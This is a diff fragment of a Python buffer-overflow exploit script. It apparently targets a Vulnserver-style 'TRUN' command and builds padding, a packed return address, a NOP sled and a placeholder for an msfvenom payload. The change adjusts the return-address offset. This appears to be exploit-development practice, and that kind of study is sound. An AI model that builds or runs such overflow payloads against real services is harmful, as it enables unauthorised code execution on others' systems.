@@ -33,7 +33,7 @@ import socket
 buf =  b''
 buf += b'TRUN /.:/'
 buf += b'A' * 2003
-buf += struct.pack("<I", int(BASE_ADDRESS, 16)) # little endian pack
+buf += struct.pack("<I", (int(BASE_ADDRESS, 16) + 576)) # little endian pack
 buf += b'\x90' * 10 # safety nops
 
 # payload (easy swap from msfvenom)
